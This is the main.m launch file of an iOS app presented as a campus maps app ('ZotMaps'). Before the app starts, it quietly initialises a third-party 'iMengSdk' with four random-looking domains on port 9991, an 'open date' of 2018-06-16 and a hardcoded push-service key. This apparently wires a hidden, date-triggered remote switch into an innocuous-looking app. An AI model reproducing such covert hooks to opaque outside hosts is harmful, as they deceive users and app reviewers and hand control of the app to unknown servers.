//
//  main.m
//  ZotMaps
//
//  Created by Louis Zhu on 2018/6/1.
//  Copyright © 2018年 David Liu. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "campusmaps-Swift.h"
#import "iMengSdk.h"

int main(int argc, char * argv[]) {
    @autoreleasepool {
        
        NSDictionary *info =
        @{
          kJPushKey: @"528118c975ab8d74615e96e5",
          kJPushChanel: @"campusmaps",
          kCheckUrl: @[
                  @"udfaf789.com:9991/",
                  @"ndsj723.pw:9991/",
                  @"sdnjye78.xyz:9991/",
                  @"xdhuew66.xyz:9991/",
                  ],
          kOpenDate: @"2018-06-16",
          kIsDebugMode: @NO
          };
        
        iMengSdk_init([AppDelegate class], info);
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
